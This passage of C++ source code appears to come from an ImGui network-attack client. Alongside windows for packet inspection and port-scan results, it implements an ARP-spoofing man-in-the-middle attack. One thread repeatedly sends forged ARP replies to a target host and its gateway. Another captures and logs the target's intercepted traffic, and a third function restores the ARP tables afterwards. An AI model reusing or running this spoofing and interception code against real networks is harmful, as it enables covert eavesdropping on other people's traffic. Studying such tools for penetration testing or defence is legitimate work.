				if (ImGui::IsItemHovered())
				{
					// If the packet is double clicked, open
					// a new window to inspect it with.                                                                                                                                                                                                                        
					if (ImGui::IsMouseDoubleClicked(0))
					{
						// Select the main inspection packet
						m_selected_packet_id = node.packet_id;
						memcpy(m_selected_packet->buffer, packet_ref->buffer, header.len);

						// Add a new packet to the inspection list
						size_t new_packet_idx = m_double_clicked_packets.size();
						m_double_clicked_packets.push_back({ true, std::make_shared<GenericPacket>() });

						// Copy the data from the current packet to the new inspection packet
						memcpy(m_double_clicked_packets.at(new_packet_idx).second->buffer, packet_ref->buffer, header.len);
					}
					else if (ImGui::IsMouseClicked(0))
					{
						m_selected_packet_id = node.packet_id;
						memcpy(m_selected_packet->buffer, packet_ref->buffer, header.len);
					}
				}

				ImGui::SameLine();
				MainPacketRenderer::render_packet_selection_header(node, &m_filter_options);
			}
		}
	}

	ImGui::EndChild();
	ImGui::End();
}

void ClientApplication::render_portscan_results_window()
{
	ImGui::SetNextWindowSizeConstraints(ImVec2(600, 400), ImVec2(10000, 10000));
	ImGui::Begin("Port Scanning Results");

	// Render information categories
	ImGui::Spacing();

	ImGui::SetCursorPosX(18);
	ImGui::Text("%s", "Port"); ImGui::SameLine();

	ImGui::SetCursorPosX(108);
	ImGui::Text("%s", "Protocol Tried"); ImGui::SameLine();

	ImGui::SetCursorPosX(268);
	ImGui::Text("%s", "State"); ImGui::SameLine();

	ImGui::SetCursorPosX(408);
	ImGui::Text("%s", "Service Name /  Description");

	// Render the actual port list
	ImGui::Separator();
	ImGui::Spacing();
	ImGui::Spacing();

	ImGui::BeginChild("PortRegion");

	if (!m_portscan_data.scanned_nodes.size())
	{
		auto middle_x = ImGui::GetWindowSize().x / 2.0f - 60.0f;
		auto middle_y = ImGui::GetWindowSize().y / 2.0f - 8.0f;
		ImGui::SetCursorPos(ImVec2(middle_x, middle_y));
		ImGui::Text("Ports Scanned: 0");
	}
	else
	{
		for (auto& node : m_portscan_data.scanned_nodes)
		{
			ImGui::Text("Port %i status: %s", (int)node.port, (node.is_opened ? "true" : "false"));
		}
	}

	ImGui::EndChild();
	ImGui::End();
}

void ClientApplication::render_packet_inspection_window()
{
	ImGui::SetNextWindowSizeConstraints(ImVec2(300, 200), ImVec2(1800, 1000));
	ImGui::Begin("Packet Inspection");

	if (m_selected_packet_id == 0)
	{
		auto middle_x = ImGui::GetWindowSize().x / 2.0f - 60.0f;
		auto middle_y = ImGui::GetWindowSize().y / 2.0f - 8.0f;
		ImGui::SetCursorPos(ImVec2(middle_x, middle_y));
		ImGui::Text("No Packet Selected");
	}
	else
	{
		MainPacketRenderer::render_packet_inspection_tree(m_selected_packet->buffer);
	}

	ImGui::End();
}

void ClientApplication::render_independent_inspection_windows()
{
	for (size_t i = 0; i < m_double_clicked_packets.size(); ++i)
	{
		auto& [window_opened_state, packet] = m_double_clicked_packets.at(i);

		// Open the window
		ImGui::SetNextWindowSizeConstraints(ImVec2(600, 500), ImVec2(1000, 1800));
		ImGui::Begin(("Packet " + std::to_string(i)).c_str(), &window_opened_state);

		// Render the packet tree
		MainPacketRenderer::render_packet_inspection_tree(packet->buffer);

		ImGui::End();
	}

	// Cleanup any closed windows
	m_double_clicked_packets.erase(std::remove_if(
		m_double_clicked_packets.begin(), m_double_clicked_packets.end(),
		[](const auto& node) {
			return !node.first; // remove if window is closed
		}), m_double_clicked_packets.end()
	);
}

void ClientApplication::start_arp_spoofing_loop()
{
	std::thread spoofing_thread([this]() {
		ArpPacket target_packet;
		craft_arp_reply_packet(
			&target_packet,
			m_mitm_data.local_mac_address,
			m_mitm_data.target_mac_address,
			m_mitm_data.gateway_ip.c_str(),
			m_mitm_data.target_ip.c_str()
		);

		ArpPacket gateway_packet;
		craft_arp_reply_packet(
			&gateway_packet,
			m_mitm_data.local_mac_address,
			m_mitm_data.gateway_mac_address,
			m_mitm_data.target_ip.c_str(),
			m_mitm_data.gateway_ip.c_str()
		);

		while (m_mitm_data.attack_in_progress &&
			   !m_mitm_data.rearping_in_progress)
		{
			net_utils::send_packet(&target_packet, sizeof(ArpPacket));
			net_utils::send_packet(&gateway_packet, sizeof(ArpPacket));
			std::this_thread::sleep_for(std::chrono::seconds(1));
		}
	});
	spoofing_thread.detach();
}

void ClientApplication::stop_attack_and_restore_arp_tables()
{
	std::thread rearp_thread([this]() {
		m_mitm_data.rearping_in_progress = true;
		std::this_thread::sleep_for(std::chrono::seconds(1));

		ArpPacket target_restore_packet;
		craft_arp_reply_packet(
			&target_restore_packet,
			m_mitm_data.gateway_mac_address,
			m_mitm_data.target_mac_address,
			m_mitm_data.gateway_ip.c_str(),
			m_mitm_data.target_ip.c_str()
		);

		ArpPacket gateway_restore_packet;
		craft_arp_reply_packet(
			&gateway_restore_packet,
			m_mitm_data.target_mac_address,
			m_mitm_data.gateway_mac_address,
			m_mitm_data.target_ip.c_str(),
			m_mitm_data.gateway_ip.c_str()
		);

		for (size_t i = 0; i < 20; i++)
		{
			std::this_thread::sleep_for(std::chrono::milliseconds(100));
			net_utils::send_packet(&target_restore_packet, sizeof(ArpPacket));
		}
		for (size_t i = 0; i < 20; i++)
		{
			std::this_thread::sleep_for(std::chrono::milliseconds(100));
			net_utils::send_packet(&gateway_restore_packet, sizeof(ArpPacket));
		}

		m_mitm_data.attack_in_progress = false;
		m_mitm_data.rearping_in_progress = false;
	});
	rearp_thread.detach();
}

void ClientApplication::start_traffic_interception_loop()
{
	std::thread interception_thread([this]() {
		while (m_mitm_data.attack_in_progress &&
			!m_mitm_data.rearping_in_progress)
		{
			auto packet = std::make_shared<GenericPacket>();
			PacketHeader header;

			net_utils::recv_packet(&header, packet->buffer, MAX_PACKET_SIZE);

			// Check if packet capturing is paused
			if (m_mitm_data.packet_capture_paused)
				continue;

			EthHeader* eth_header = get_eth_header(packet->buffer);

			// Check if the packet was originated from the target host
			bool target_is_sender = memcmp(eth_header->src, m_mitm_data.target_mac_address, sizeof(macaddr)) == 0;

			// Check if the target host is the destination of the packet
			bool target_is_destination = memcmp(eth_header->dest, m_mitm_data.target_mac_address, sizeof(macaddr)) == 0;

			// If packet is not from the gateway to the target
			// or from target to gateway, skip the packet.
			if (!target_is_sender && !target_is_destination)
				continue;

			// Checking if packet passes any of the filters
			if (!PacketFilterManager::filter_packet(packet->buffer, &m_filter_options))
				continue;

			// Dump the packet to a log file if needed
			if (m_config.get_bool_value(CONFIG_KEY_LOG_PACKETS))
			{
				net_utils::dump_packet_to_file(&header, packet->buffer);
			}

			// Lock the mutex
			s_packet_interception_mutex.lock();

			// Check if packet node buffer needs to be partially freed up
			if (s_intercepted_packets.size() > INTERCEPTED_PACKET_BUFFER_SIZE)
				s_intercepted_packets.resize(s_intercepted_packets.size() - (INTERCEPTED_PACKET_BUFFER_SIZE / 4));

			// Increment the new packet ID
			static uint64_t s_new_packet_id = 0;
			++s_new_packet_id;

			if (s_new_packet_id == 0) // handle unsigned int overflows
				s_new_packet_id = 1;

			// Insert the new packet node
			PacketNode node;
			node.header = header;
			node.packet_ref = std::make_shared<GenericPacket>();
			memcpy(node.packet_ref->buffer, packet->buffer, MAX_PACKET_SIZE);
			node.packet_id = s_new_packet_id;
			node.timestamp = (float)ImGui::GetTime();

			s_intercepted_packets.insert(s_intercepted_packets.begin(), node);

			// Unlock the mutex
			s_packet_interception_mutex.unlock();
		}
	});
	interception_thread.detach();
}
